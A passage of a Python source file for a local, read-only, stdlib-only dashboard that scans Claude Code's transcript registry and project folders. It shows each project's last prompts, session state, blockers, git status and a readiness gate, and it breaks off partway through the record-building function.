"""Product Library. A local read-only mission control over every project
you run Claude Code in.

    py library.py              # serve on http://127.0.0.1:7777
    py library.py --snapshot   # the same, and keep a history of every change (opt-in)
    py library.py --snapshot --once   # record one snapshot and exit (for a scheduled task)
    py library.py --selftest    # assert-based checks, no server, no network

WHY THIS READS TWO SOURCES. Claude Code already keeps a registry at
~/.claude/projects/<slug>/, so the project list does not need to be invented -
only read. But the slug is LOSSY (`D--Project-Alpha-research` is ambiguous between
`D:\\Project Alpha\\research` and `D:\\Project Alpha research`), so the real path is taken
from the `cwd` field inside a transcript record and NEVER derived from the slug.
The second source is the project folder itself: `.claude/session-state.md`
carries curated frontmatter whose `next_action` is literally "where I left off".

WHY read-only. It reads 57 MB of irreplaceable transcript history. There is no
code path here that writes, moves or deletes anything under a project folder.
The one write is opt-in: --snapshot keeps a SQLite history in the app's OWN
data folder (DATA_DIR), and refuses to if that folder sits inside ~/.claude,
the registry, the plans or any project.

ponytail: stdlib only - no FastAPI, so nothing is pip-installed into the
Microsoft Store python alias (which has known venv/PATH quirks on this box).
The in-house precedent is D:\\Project Beta\\server.py, same shape.
"""
import hashlib
import http.server
import json
import os
import re
import secrets
import shutil
import sqlite3
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

HOST = "127.0.0.1"
PORT = int(os.environ.get("LIBRARY_PORT", "7777"))
HERE = os.path.dirname(os.path.abspath(__file__))
# LIBRARY_REGISTRY points the scan at another registry, e.g. sample/make_sample.py's
# fake one, so a sample never mixes with (or writes near) the real ~/.claude.
REGISTRY = os.environ.get("LIBRARY_REGISTRY") or os.path.join(os.path.expanduser("~"), ".claude", "projects")
# Overridable like REGISTRY, so a sample never shows the real ~/.claude/plans.
PLANS_DIR = os.environ.get("LIBRARY_PLANS_DIR") or os.path.join(os.path.expanduser("~"), ".claude", "plans")
# The opt-in history (--snapshot, or LIBRARY_SNAPSHOT=1). DATA_DIR is the only
# folder this app ever writes to: LIBRARY_DATA_DIR, else the per-user app data
# folder (%LOCALAPPDATA% on Windows, $XDG_DATA_HOME or ~/.local/share elsewhere).
DATA_DIR = os.environ.get("LIBRARY_DATA_DIR") or (
    os.path.join(os.environ["LOCALAPPDATA"], "ProductLibrary") if os.name == "nt" and os.environ.get("LOCALAPPDATA")
    else os.path.join(os.environ.get("XDG_DATA_HOME") or os.path.join(os.path.expanduser("~"), ".local", "share"),
                      "product-library"))
SNAPSHOTS = os.environ.get("LIBRARY_SNAPSHOT", "").strip().lower() in ("1", "true", "yes")
# While serving with snapshots on, a scan also runs on this clock, so history
# is kept even with no browser open.
SNAPSHOT_EVERY = int(os.environ.get("LIBRARY_SNAPSHOT_EVERY", "600"))

# Folders the registry cannot know about, because a registry entry only exists
# once Claude has actually been run there. Empty by default: machine-specific
# paths never belong in the repo. Set LIBRARY_EXTRA_ROOTS to a list separated by
# os.pathsep (";" on Windows), e.g. LIBRARY_EXTRA_ROOTS="D:\work\a;D:\work\b".
# An empty value also means none (the sample uses that).
EXTRA_ROOTS = []
# Missing folders are skipped by scan(), so a wrong path costs nothing.
if os.environ.get("LIBRARY_EXTRA_ROOTS") is not None:
    EXTRA_ROOTS = [p for p in os.environ["LIBRARY_EXTRA_ROOTS"].split(os.pathsep) if p.strip()]

# Files worth showing, in the order they are trusted. session-state.md first
# because its frontmatter is curated; the append-only logs are big and are
# TAILED, never read whole.
STATE_FILE = os.path.join(".claude", "session-state.md")
APPEND_LOGS = ("HANDOFF.md", "PROJECT.md")
OTHER_FILES = ("CLAUDE.md", "README.md", "RUNBOOK.md", "Zeta.md")

# A prompt that says nothing about where you left off. Project Beta's actual
# last prompt is "continue", which is why this list exists.
STOPLIST = {
    "continue", "ok", "okay", "yes", "y", "no", "go", "go on", "proceed",
    "sure", "thanks", "thank you", "next", "done", "k", "yep", "yeah",
    "carry on", "keep going",
}
MIN_PROMPT_CHARS = 12
MIN_JSONL_BYTES = 200
TAIL_BYTES = 512 * 1024   # enough to hold many records, O(1) instead of O(file)
HEAD_BYTES = 256 * 1024   # cwd sits on the first attachment record

_cache = {}   # (kind, path, mtime, size) -> parsed value
_scan_cache = {"at": 0.0, "data": None}


# ---------------------------------------------------------------- file reading

def _stat_key(kind, path):
    """Cache identity for a file: nanosecond mtime plus size.

    st_mtime truncated to a whole second missed an edit made inside the same
    second at identical length - e.g. flipping `status: paused` to `status:
    active`. st_mtime_ns does not.
    """
    try:
        st = os.stat(path)
    except OSError:
        return None
    return (kind, os.path.normcase(path), st.st_mtime_ns, st.st_size)


def read_text(path, limit=None):
    """UTF-8 with replacement, ALWAYS explicit, and BOM-tolerant.

    Python's open() defaults to the locale codec on Windows (cp1252 here). This
    corpus contains em dashes and Arabic; reading it as cp1252 produces mojibake
    at best and UnicodeDecodeError at worst. Verified live before writing this.

    utf-8-sig rather than utf-8 because a BOM - which plenty of Windows editors
    write - would otherwise leave the first line as "﻿---" and make the
    whole frontmatter parse silently return nothing.
    """
    with open(path, "r", encoding="utf-8-sig", errors="replace") as fh:
        return fh.read() if limit is None else fh.read(limit)


def tail_text(path, nbytes=TAIL_BYTES):
    """Last nbytes of a file, decoded, first (possibly partial) line dropped."""
    size = os.path.getsize(path)
    with open(path, "rb") as fh:
        if size > nbytes:
            fh.seek(size - nbytes)
            raw = fh.read()
            nl = raw.find(b"\n")
            raw = raw[nl + 1:] if nl != -1 else raw
        else:
            raw = fh.read()
    return raw.decode("utf-8", errors="replace")


def tail_lines(path, n):
    return tail_text(path).splitlines()[-n:]


# --------------------------------------------------------- transcript scanning

def _jsonl_lines(text):
    for line in text.splitlines():
        if len(line) < 2:
            continue
        try:
            yield json.loads(line)
        except (ValueError, TypeError):
            continue


def resolve_cwd(jsonl_path):
    """The project's real path, from the first record that carries `cwd`.

    NOT line 1: line 1 is a `queue-operation` record with no cwd. Verified on
    every transcript on this machine - cwd first appears on an `attachment`
    record at line 2-4, and carries gitBranch alongside it.
    """
    key = _stat_key("cwd", jsonl_path)
    if key and key in _cache:
        return _cache[key]
    out = (None, None)
    try:
        head = read_text(jsonl_path, HEAD_BYTES)
    except OSError:
        return out
    for rec in _jsonl_lines(head):
        cwd = rec.get("cwd")
        if cwd:
            out = (cwd, rec.get("gitBranch") or None)
            break
    if key:
        _cache[key] = out
    return out


def resolve_project(tx):
    """(path, branch) from the newest transcript that actually carries a `cwd`.

    Trying only the newest file made a project unresolvable whenever that one
    session happened not to record a cwd, even though an older transcript did.
    """
    for _mtime, _size, path in tx:
        cwd, branch = resolve_cwd(path)
        if cwd:
            return cwd, branch
    return None, None


def _prompts_in(jsonl_path, full=False):
    """last-prompt values from this transcript, oldest to newest.

    Tails the file rather than streaming it: a 7 MB transcript should not cost
    7 MB of reads to answer "what was the last thing said".

    `full` reads the whole file. It exists because the tail window cuts the file
    mid-line, and the record straddling that cut is discarded - so a substantive
    prompt can be lost while a later "continue" survives. The caller escalates
    to a full read when everything the window returned was trivial.
    """
    key = _stat_key("prompts-full" if full else "prompts", jsonl_path)
    if key and key in _cache:
        return _cache[key]
    try:
        text = read_text(jsonl_path) if full else tail_text(jsonl_path)
    except OSError:
        return []
    found = [rec["lastPrompt"] for rec in _jsonl_lines(text)
             if rec.get("type") == "last-prompt" and rec.get("lastPrompt")]
    if not found and not full and os.path.getsize(jsonl_path) > TAIL_BYTES:
        return _prompts_in(jsonl_path, full=True)
    # De-dup consecutive repeats: last-prompt is written repeatedly per session.
    out = [p for i, p in enumerate(found) if i == 0 or p != found[i - 1]]
    if key:
        _cache[key] = out
    return out


def truncated_tail(jsonl_path):
    """Is this file big enough that tailing it could have cut a record?"""
    try:
        return os.path.getsize(jsonl_path) > TAIL_BYTES
    except OSError:
        return False


def is_substantive(prompt):
    flat = " ".join(prompt.split()).strip().lower().rstrip(".!?")
    return len(flat) >= MIN_PROMPT_CHARS and flat not in STOPLIST


def transcripts(slug_dir):
    """.jsonl files in a registry dir, newest first.

    Non-recursive on purpose: the UUID subdirectories were checked and contain
    ZERO .jsonl files, so recursing buys nothing and costs a walk.
    """
    out = []
    try:
        for name in os.listdir(slug_dir):
            if not name.endswith(".jsonl"):
                continue
            p = os.path.join(slug_dir, name)
            try:
                st = os.stat(p)
            except OSError:
                continue
            out.append((st.st_mtime, st.st_size, p))
    except OSError:
        return []
    out.sort(reverse=True)
    return out


def last_prompts(slug_dir):
    """(prompts, session_id, trivial_only) - walks transcripts newest-first
    until one YIELDS a prompt.

    Stopping at the newest file is the bug this avoids: Project Beta's newest
    transcript is 15 KB and holds no prompt, while the session that matters is a
    7.2 MB file from earlier the same day. Verified by test.
    """
    for _mtime, size, path in transcripts(slug_dir):
        if size < MIN_JSONL_BYTES:
            continue
        prompts = _prompts_in(path)
        if not prompts:
            continue
        session_id = os.path.splitext(os.path.basename(path))[0]
        good = [p for p in prompts if is_substantive(p)]
        if not good and truncated_tail(path):
            # Everything in the tail window was filler. The one line the window
            # cut in half may have been the real prompt, so pay for a full read
            # rather than reporting "continue" as the state of the project.
            prompts = _prompts_in(path, full=True) or prompts
            good = [p for p in prompts if is_substantive(p)]
        if good:
            return good[-3:], session_id, False
        return prompts[-1:], session_id, True
    return [], None, False


def _story_in(jsonl_path):
    """One session's title, prompts and PR links, from Claude Code's own records.

    `ai-title` is the title Claude gives a session, `custom-title` the one the
    user typed (it wins), and both are rewritten as a session goes, so the LAST
    record is current. A `pr-link` whose URL is not https is dropped here, so
    nothing else ever has to wonder whether it is safe to render as a link.

    ponytail: a full read per transcript, cached per (path, mtime, size). The
    session being worked on changes every poll and is re-read each time; an
    index of byte offsets would fix that if a multi-MB live transcript ever
    makes a poll slow.
    """
    key = _stat_key("story", jsonl_path)
    if key and key in _cache:
        return _cache[key]
    out = {"ai": None, "custom": None, "prompts": [], "prs": []}
    try:
        text = read_text(jsonl_path)
    except OSError:
        return out
    for rec in _jsonl_lines(text):
        kind = rec.get("type")
        if kind == "ai-title" and rec.get("aiTitle"):
            out["ai"] = rec["aiTitle"]
        elif kind == "custom-title" and rec.get("customTitle"):
            out["custom"] = rec["customTitle"]
        elif kind == "last-prompt" and rec.get("lastPrompt"):
            out["prompts"].append(rec["lastPrompt"])
        elif kind == "pr-link" and str(rec.get("prUrl") or "").startswith("https://"):
            out["prs"].append({"number": rec.get("prNumber"), "repo": rec.get("prRepository"),
                               "url": rec["prUrl"], "at": rec.get("timestamp")})
    if key:
        _cache[key] = out
    return out


CHAT_MAX = 400          # messages shown per chat; older ones are counted, not sent
CHAT_CHARS = 4000       # per message; a pasted log should not become a 2 MB page
# User records that are Claude Code's own plumbing, not something the user typed.
CHAT_PLUMBING = ("<command-", "<local-command-", "<system-reminder>", "Caveat: The messages below")


def chat(jsonl_path):
    """One session as {"messages": [{role, text, at}], "cut": n}, oldest first.

    What was said, not how: the user's prompts and Claude's text replies. A
    tool call becomes one short line ("used Bash, Edit"); tool results, meta
    and sidechain records are left out. `cut` counts the older messages beyond
    CHAT_MAX. Read-only, cached per (path, mtime, size) like the story.
    """
    key = _stat_key("chat", jsonl_path)
    if key and key in _cache:
        return _cache[key]
    out = []
    try:
        text = read_text(jsonl_path)
    except OSError:
        return {"messages": [], "cut": 0}
    for rec in _jsonl_lines(text):
        kind = rec.get("type")
        if kind not in ("user", "assistant") or rec.get("isMeta") or rec.get("isSidechain"):
            continue
        content = (rec.get("message") or {}).get("content")
        blocks = [{"type": "text", "text": content}] if isinstance(content, str) else \
            content if isinstance(content, list) else []
        said, tools = [], []
        for b in blocks:
            if not isinstance(b, dict):
                continue
            if b.get("type") == "text" and str(b.get("text") or "").strip():
                said.append(str(b["text"]).strip())
            elif b.get("type") == "tool_use" and kind == "assistant":
                tools.append(str(b.get("name") or "a tool"))
        words = "\n\n".join(said)
        if kind == "user" and words.startswith(CHAT_PLUMBING):
            continue
        at = rec.get("timestamp")
        if words:
            if len(words) > CHAT_CHARS:
                words = words[:CHAT_CHARS] + " [...]"
            out.append({"role": "you" if kind == "user" else "claude", "text": words, "at": at})
        if tools:
            if out and out[-1]["role"] == "tool":         # a run of tool calls reads as one line
                seen = out[-1]["tools"]
                seen += [t for t in tools if t not in seen]
                out[-1]["text"] = "used " + ", ".join(seen)
            else:
                names = list(dict.fromkeys(tools))
                out.append({"role": "tool", "text": "used " + ", ".join(names), "at": at, "tools": names})
    for m in out:
        m.pop("tools", None)
    res = {"messages": out[-CHAT_MAX:], "cut": max(0, len(out) - CHAT_MAX)}
    if key:
        _cache[key] = res
    return res


def chat_file(rec, session_id):
    """The transcript for this session of this project, or None.

    Never a path built from the request: the id must name one of the project's
    own transcripts, listed from its registry folder, so `../x` matches nothing.
    """
    if rec.get("source") != "registry" or not session_id:
        return None
    for _m, _size, path in transcripts(os.path.join(REGISTRY, rec["slug"])):
        if os.path.splitext(os.path.basename(path))[0] == session_id:
            return path
    return None


def project_story(tx):
    """(origin, chapters, prs) across a project's transcripts, oldest first.

    origin is the first SUBSTANTIVE prompt of the oldest session that has one:
    the reason the project exists, next to the latest prompt the bubble already
    shows. chapters is Claude's own title for each session. prs is what shipped.
    """
    origin, chapters, prs, seen = None, [], [], set()
    for mtime, _size, path in reversed(tx):          # tx is newest first
        s = _story_in(path)
        if origin is None:
            first = next((p for p in s["prompts"] if is_substantive(p)), None)
            if first:
                origin = {"prompt": first, "at": _iso(mtime)}
        title = s["custom"] or s["ai"]
        if title:
            chapters.append({"title": title, "at": _iso(mtime),
                             "session_id": os.path.splitext(os.path.basename(path))[0]})
        for pr in s["prs"]:
            if pr["url"] not in seen:
                seen.add(pr["url"])
                prs.append(pr)
    prs.sort(key=lambda p: p["at"] or "")
    return origin, chapters, prs


# ------------------------------------------------------------ project folder

# stage and proof are written by skills/library-checkpoint; the rest predate it.
FM_SCALARS = ("status", "stage", "last_updated", "current_task", "next_action", "proof",
              "for", "bet")


BLOCK_SCALARS = (">", "|", ">-", "|-", ">+", "|+")
# Trailing \b matters: without it "## Resumed the OCR pipeline yesterday" counts
# as the resume heading, and since the FIRST match wins it beats the real one.
RESUME_RE = re.compile(r"^#{1,4}\s.*\b(RESUME|NEXT ACTION|NEXT STEP|PICK UP)\b", re.I)
UPDATED_RE = re.compile(r"\*\*Updated:\*\*\s*([0-9]{4}-[0-9]{2}-[0-9]{2})")


def _unquote(val):
    val = val.strip()
    if len(val) >= 2 and val[0] == val[-1] and val[0] in "\"'":
        return val[1:-1]
    return val


def parse_frontmatter(text):
    """Reader for session-state.md frontmatter, which comes in THREE real shapes.

    ponytail: stdlib has no YAML and pulling one in for five known keys is a
    dependency for nothing - but the shapes below are what the files on this
    machine actually contain, verified by reading them, so all three are handled:

      Project Alpha / Project Epsilon:  status: paused
                                    blockers: ["a", "b"]        <- inline JSON
      Project Beta:                status: >                   <- block scalar
                                      folded text continues
                                    blockers:                   <- block sequence
                                      - "a"

    `raw` is always returned, so a shape nobody anticipated still shows the block
    verbatim rather than raising or silently rendering an empty panel.
    """
    lines = text.splitlines()
    if not lines or lines[0].strip() != "---":
        return None
    # The terminator must sit at column 0. Matching a *stripped* "---" let an
    # indented horizontal rule inside a block scalar end the frontmatter early,
    # truncating that value and hiding every key after it.
    end = next((i for i in range(1, len(lines)) if lines[i].rstrip() == "---"), None)
    if end is None:
        return None
    body = lines[1:end]
    out = {"raw": "\n".join(body), "blockers": [], "format": "frontmatter"}

    i = 0
    while i < len(body):
        m = re.match(r"^([A-Za-z_][A-Za-z0-9_]*):\s*(.*)$", body[i])
        if not m:
            i += 1
            continue
        key, val = m.group(1), m.group(2).strip()
        i += 1

        if val in BLOCK_SCALARS:
            chunk = []
            while i < len(body) and (not body[i].strip() or body[i][:1].isspace()):
                chunk.append(body[i].strip())
                i += 1
            # '>' folds newlines into spaces, '|' keeps them. Either way the
            # continuation lines ARE the value, not the '>' marker.
            if val[0] == "|":
                val = "\n".join(chunk).strip()
            else:
                val = " ".join(c for c in chunk if c).strip()
        elif val[:1] in ("\"", "'") and not _closed(val):
            # A quoted scalar wrapped onto following lines. Without this the
            # value came back as the first line WITH its opening quote still on.
            parts = [val]
            while i < len(body) and not _closed(" ".join(parts)):
                parts.append(body[i].strip())
                i += 1
            val = " ".join(parts)
        elif val == "":
            items = []
            while i < len(body):
                # Sequence dashes at column 0 are valid YAML and common, so the
                # leading-whitespace requirement here silently produced [].
                seq = re.match(r"^\s*-\s+(.*)$", body[i])
                if seq:
                    items.append(_unquote(seq.group(1)))
                    i += 1
                elif not body[i].strip():
                    i += 1
                else:
                    break
            if items:
                if key == "blockers":
                    out["blockers"] = items
                elif key in FM_SCALARS:
                    out[key] = " · ".join(items)
                continue

        if key == "blockers":
            out["blockers"] = _as_list(val)
        elif key in FM_SCALARS:
            out[key] = _unquote(val)
    return out


def _closed(val):
    """Does this quoted scalar have its closing quote yet?"""
    q = val[:1]
    return q in ("\"", "'") and len(val) >= 2 and val.rstrip().endswith(q)


def _as_list(val):
    """`blockers:` as a JSON value - list only.

    Anything non-list means "no blockers stated", not "one blocker". Wrapping
    it invented a blocker: `blockers: null` became ['None'] and `{}` became
    ['{}'], each showing a phantom count of 1 on the card.
    """
    val = val.strip()
    if not val or val.lower() in ("null", "~", "none", "[]", "{}"):
        return []
    try:
        parsed = json.loads(val)
    except (ValueError, TypeError):
        return [val]
    if isinstance(parsed, list):
        return [str(x) for x in parsed if str(x).strip()]
    return []


def parse_plain_state(text):
    """Fallback for a session-state.md with no frontmatter at all.

    Project Gamma's is a plain markdown doc whose resume point is a
    '## RESUME HERE - next actions' section. Without this it scanned as having no
    state despite being 13 KB of exactly the state we want.
    """
    lines = text.splitlines()
    start = next((i for i, l in enumerate(lines) if RESUME_RE.match(l)), None)
    if start is None:
        return None
    chunk = []
    fence = False
    for line in lines[start + 1:]:
        if line.lstrip().startswith("```"):
            fence = not fence
        # A '# comment' inside a fenced shell block is not a heading; without
        # this the section stopped at the first line of any code sample.
        elif not fence and re.match(r"^#{1,4}\s", line):
            break
        chunk.append(line)
    body = "\n".join(chunk).strip()
    if not body:
        return None
    # The newest stamp, not the first one in the file - a changelog row near the
    # top would otherwise date the project months earlier than it is.
    stamps = UPDATED_RE.findall(text)
    return {
        "raw": body[:4000],
        "format": "plain",
        "status": None,
        "last_updated": max(stamps) if stamps else None,
        "current_task": lines[start].lstrip("#").strip(),
        "next_action": body[:1500],
        "blockers": [],
    }


def open_blockers(blockers):
    """Entries already marked DONE are not outstanding."""
    return [str(b) for b in blockers
            if not str(b).lstrip().upper().startswith("DONE")]


# Whose decisions count as "waiting on you". Set LIBRARY_OWNER to the name you
# write in blockers (e.g. "Sam" for "Sam [S]: ..."); the default is "Me".
OWNER = os.environ.get("LIBRARY_OWNER") or "Me"


def waiting_on_me(blockers):
    """Blockers that are yours to clear: they start with OWNER, as in the
    'Me [M]:' prefix the checkpoint skill writes."""
    return [b for b in open_blockers(blockers)
            if re.match(r"^\s*%s\b" % re.escape(OWNER), b, re.I)]


# ------------------------------------------------- drift and the readiness gate
#
# Both are ported from Product Harness. There, a grade is stamped with a hash of
# the evidence it saw and goes stale the moment that evidence changes. Here the
# "grade" is session-state.md and the evidence is the work itself: a transcript
# or a commit newer than the last state write means next_action may describe a
# point the project has already moved past.

# The session that writes the state keeps writing its own transcript for a while
# afterwards, so "newer at all" would flag every project that just checkpointed.
# ponytail: one global grace; a per-project allowance if long tails misfire.
# LIBRARY_DRIFT_GRACE (seconds) overrides it, for tests that need STALE in seconds.
DRIFT_GRACE = int(os.environ.get("LIBRARY_DRIFT_GRACE", "3600"))


def drift(state_at, activity):
    """None, or how far the newest work is ahead of the last state write.

    `activity` is (epoch_seconds | None, source) pairs. Mtime of the state file
    rather than its `last_updated` field: the field is hand-typed and often not
    bumped, the mtime moves on every save.
    """
    if state_at is None:
        return None
    newer = [(ts, src) for ts, src in activity
             if ts is not None and ts - state_at > DRIFT_GRACE]
    if not newer:
        return None
    ts, src = max(newer)
    return {"by": src, "state_at": _iso(state_at), "activity_at": _iso(ts),
            "behind_hours": round((ts - state_at) / 3600, 1)}


def _epoch(iso):
    try:
        return datetime.fromisoformat(iso).timestamp()
    except (TypeError, ValueError):
        return None


# 'Me [M]:' / 'Sam [A]:' - the owner prefix the frontmatter already uses.
OWNER_RE = re.compile(r"^\s*[^:\[\]\n]{1,40}\[[^\]\n]{1,8}\]\s*:")


def _has_proof(proof):
    """Filled in for real. The skill's 'none yet' placeholder does not count,
    for proof or for a catalog-card line."""
    p = (proof or "").strip()
    return bool(p) and not p.lower().startswith("none yet")


def gate(rec):
    """Harness's verdictFor, with deterministic checks instead of a model.

    A hard failure fails the gate; a soft one is reported as a gap and does
    not. Hard gaps are listed first so `next` is always the question that is
    actually blocking. Without a state file the other checks have nothing to
    inspect, so they are not reported as separate failures.
    """
    st = rec.get("state")
    checks = [("has_state", True,
               "Is there a .claude/session-state.md saying where you left off?",
               bool(st))]
    if st:
        checks += [
            ("next_action", True,
             "Is next_action a concrete step rather than filler?",
             is_substantive(st.get("next_action") or "")),
            ("fresh", True,
             "Was the state rewritten after the latest work?",
             not rec.get("drift")),
            ("blockers_owned", False,
             "Does every open blocker name who clears it?",
             all(OWNER_RE.match(b) for b in open_blockers(rec.get("blockers") or []))),
            ("proof", False,
             "Is there proof the last step worked?",
             _has_proof(st.get("proof"))),
            ("proof_commit", False,
             "The proof cites an unknown commit: does it exist in this repo?",
             not rec.get("proof_unknown")),
            ("proof_quote", False,
             "A quote doesn't match its source: is it word for word?",
             not rec.get("proof_unquoted")),
            # The catalog card. A library's real job: a building found months
            # later should say who it was for and why it mattered.
            ("card", False,
             "Would future-you know who this is for and why it mattered?",
             _has_proof(st.get("for")) and _has_proof(st.get("bet"))),
        ]
    gaps = [{"id": cid, "hard": hard, "question": q}
            for cid, hard, q, ok in checks if not ok]
    return {"verdict": "fail" if any(g["hard"] for g in gaps) else "pass",
            "gaps": gaps,
            "next": gaps[0]["question"] if gaps else None}


# The state fields a person (or Claude) types, in the order the report lists them.
TRUTH_FIELDS = (("next_action", "next action"), ("status", "status"), ("stage", "stage"),
                ("current_task", "current task"), ("for", "who it's for"),
                ("bet", "why it matters"), ("proof", "proof"))


def truth(rec):
    """The truth boundary: what the machine checked vs what is only written down.

    `checked` holds every claim the scan verified, true or false: the state was
    rewritten after the latest work, each cited commit is in the repo, each
    quote is word for word in its file. `written` names the filled-in fields
    that cite nothing the machine checked. A cited commit with no repo to ask
    is not checked (unknown_commits says nothing there), so its field stays
    written. None without a state file: nothing is written down at all.
    ponytail: quote verdicts are per file (proof_unquoted holds file names), so
    two quotes from one file share a verdict; per-quote results if that misleads.
    """
    st = rec.get("state")
    if not st:
        return None
    has_repo = bool((rec.get("git") or {}).get("committed"))
    unknown = set(rec.get("proof_unknown") or [])
    unquoted = set(rec.get("proof_unquoted") or [])
    checked = [{"what": "state rewritten after the latest work", "ok": not rec.get("drift")}]
    written = []
    for key, label in TRUTH_FIELDS:
        val = st.get(key)
        if not _has_proof(val):
            continue
        cites = [{"what": f"{rel} has the quoted words", "ok": rel not in unquoted}
                 for rel, _q in QUOTE_RE.findall(val)]
        if key == "proof":
            cites += [{"what": f"commit {h} is in the repo", "ok": h not in unknown}
                      for h in PROOF_COMMIT_RE.findall(val) if has_repo or h in unknown]
        checked += cites
        if not cites:
            written.append(label)
    n = len(open_blockers(rec.get("blockers") or []))
    if n:
        written.append(f"{n} blocker" + ("s" if n > 1 else ""))
    return {"checked": checked, "written": written}


def read_state(path):
    fp = os.path.join(path, STATE_FILE)
    if not os.path.isfile(fp):
        return None, None
    key = _stat_key("state", fp)
    if key and key in _cache:
        return _cache[key], fp
    # Frontmatter is at the head here - this file is NOT append-only.
    txt = read_text(fp, HEAD_BYTES)
    state = parse_frontmatter(txt) or parse_plain_state(txt)
    if key:
        _cache[key] = state
    return state, fp


def _last_heading(lines):
    """The last real heading in these lines.

    Fence-aware, because a template row inside a ``` block would otherwise be
    reported as the newest entry. Accepts ## through ####, since an entry
    written one level deeper was previously skipped in favour of an older ##.
    """
    fence = False
    found = None
    for line in lines:
        if line.lstrip().startswith("```"):
            fence = not fence
            continue
        if not fence and re.match(r"^#{2,4}\s", line):
            found = line
    return found


def read_logs(path):
    """Append-only logs, TAILED.

    HANDOFF.md says so in its own header: 'Each session appends one entry at the
    bottom'. Project Alpha's is 251 KB and its FIRST heading is 2026-05-31 - reading
    the head would display four-month-old state as current.
    """
    out = []
    for name in APPEND_LOGS:
        fp = os.path.join(path, name)
        if not os.path.isfile(fp):
            continue
        lines = tail_lines(fp, 400)
        heading = _last_heading(lines)
        out.append({
            "name": name,
            "size": os.path.getsize(fp),
            "heading": heading,
            "tail": "\n".join(lines[-60:]),
        })
    return out


def list_files(path):
    out = []
    for name in (STATE_FILE,) + APPEND_LOGS + OTHER_FILES:
        fp = os.path.join(path, name)
        if not os.path.isfile(fp):
            continue
        st = os.stat(fp)
        out.append({
            "name": name.replace("\\", "/"),
            "size": st.st_size,
            "mtime": _iso(st.st_mtime),
        })
    return out


def git_info(path):
    """None when there is no repo - only 3 of the 10 real project folders have
    one, so this is optional enrichment and never a required field."""
    if not os.path.isdir(os.path.join(path, ".git")):
        return None
    git = shutil.which("git")
    if not git:
        return None

    def run(args):
        try:
            # List-form args, never a shell string: 'D:\Project Beta' has a
            # space in it and a shell string would split it into two paths.
            r = subprocess.run([git, "-C", path] + args, capture_output=True,
                               text=True, encoding="utf-8", errors="replace",
                               timeout=10)
            return r.stdout.strip() if r.returncode == 0 else ""
        except (OSError, subprocess.SubprocessError):
            return ""

    branch = run(["rev-parse", "--abbrev-ref", "HEAD"])
    last = run(["log", "-1", "--format=%s\x1f%cI"])
    subject, _, when = last.partition("\x1f")
    status = run(["status", "--porcelain"])
    return {
        "branch": branch or None,
        "subject": subject or None,
        "committed": when or None,
        "dirty": len([l for l in status.splitlines() if l.strip()]),
    }


# "docs/interviews.md: 'exact words'" - single quotes, because the frontmatter
# value around it is already double-quoted.
QUOTE_RE = re.compile(r"([\w./\\-]+\.[A-Za-z0-9]{1,8}):\s*'([^']{8,})'")


def unverified_quotes(path, *texts):
    """Files whose quoted words are not actually in them (Harness's verbatim
    citation rule). Whitespace is normalised, so a quote that a Markdown file
    wraps across lines still matches. A path outside the project folder never
    verifies: the project is the evidence, nothing else."""
    root = os.path.realpath(path)
    bad = []
    for text in texts:
        for rel, quote in QUOTE_RE.findall(text or ""):
            fp = os.path.realpath(os.path.join(root, rel.replace("\\", os.sep)))
            inside = fp.startswith(root + os.sep)
            body = read_text(fp) if inside and os.path.isfile(fp) else None
            if body is None or " ".join(quote.split()) not in " ".join(body.split()):
                bad.append(rel)
    return bad


PROOF_COMMIT_RE = re.compile(r"\bcommit\s+([0-9a-f]{7,40})\b", re.I)


def unknown_commits(path, proof):
    """Hashes the proof cites as 'commit <hash>' that this repo does not have.

    Harness's citation check: evidence must exist, not just be quoted. With no
    repo or no git there is nothing to ask, so nothing counts as unknown.
    """
    cited = PROOF_COMMIT_RE.findall(proof or "")
    git = shutil.which("git")
    if not cited or not git or not os.path.isdir(os.path.join(path, ".git")):
        return []
    missing = []
    for h in cited:
        try:
            # ^{commit}: a tree or blob hash also passes a bare `cat-file -e`.
            r = subprocess.run([git, "-C", path, "cat-file", "-e", h + "^{commit}"],
                               capture_output=True, timeout=10)
        except (OSError, subprocess.SubprocessError):
            continue   # git could not answer: unverified, not disproven
        if r.returncode != 0:
            missing.append(h)
    return missing


# -------------------------------------------------------------------- scanning

def _iso(ts):
    return datetime.fromtimestamp(ts, timezone.utc).astimezone().isoformat()


def _slugify(path):
    s = re.sub(r"[^A-Za-z0-9]+", "-", path).strip("-").lower()
    return s or "root"


def _display_name(path, slug):
    base = os.path.basename(path.rstrip("\\/"))
    if base:
        return base
    drive = os.path.splitdrive(path)[0]
    return f"{drive}\\ (drive root)" if drive else slug


def _build(path, slug, source, slug_dir=None, branch_hint=None):
    exists = bool(path) and os.path.isdir(path)
    rec = {
        "id": slug,
        "slug": slug,
        "source": source,
        "path": path,
        "path_exists": exists,
        "unresolved": not bool(path),
        "missing": bool(path) and not exists,
        "name": _display_name(path, slug) if path else _pretty_slug(slug),
        "sessions": 0,
        "bytes": 0,
        "last_activity": None,
        "prompts": [],
        "prompt_trivial": False,
        "session_id": None,
        "state": None,
        "state_file": None,
        "blockers": [],
        "waiting": [],
        "logs": [],
        "files": [],
        "memory": None,
        "git": None,
        "note": None,
        "drift": None,
        "origin": None,
        "chapters": [],
        "prs": [],
        "proof_unknown": [],
        "proof_unquoted": [],
        "gate": None,
        "truth": None,
    }
    newest_tx = None

    if slug_dir:
        tx = transcripts(slug_dir)
        newest_tx = tx[0][0] if tx else None
        rec["sessions"] = len(tx)
        rec["bytes"] = sum(size for _m, size, _p in tx)
        if tx:
            rec["last_activity"] = _iso(tx[0][0])
        prompts, session_id, trivial = last_prompts(slug_dir)
        rec["prompts"] = prompts
        rec["prompt_trivial"] = trivial
        rec["session_id"] = session_id
        rec["origin"], rec["chapters"], rec["prs"] = project_story(tx)
        mem = os.path.join(slug_dir, "memory", "MEMORY.md")
        if os.path.isfile(mem):
            rec["memory"] = read_text(mem, 20000)

    if not path:
        rec["note"] = ("No transcript, so the real path cannot be recovered - "
                       "the registry slug is ambiguous by itself.")
        return rec
    if not exists:
        rec["note"] = "Folder no longer exists at this path."
        return rec

    state, state_file = read_state(path)
    if state:
        rec["state"] = {k: state.get(k) for k in FM_SCALARS}
        rec["state"]["raw"] = state.get("raw")
        rec["state"]["format"] = state.get("format")
        rec["blockers"] = state.get("blockers", [])
        rec["waiting"] = waiting_on_me(rec["blockers"])
        rec["state_file"] = state_file
    rec["logs"] = read_logs(path)
    rec["files"] = list_files(path)
    rec["git"] = git_info(path) or (
        {"branch": branch_hint, "subject": None, "committed": None, "dirty": None}
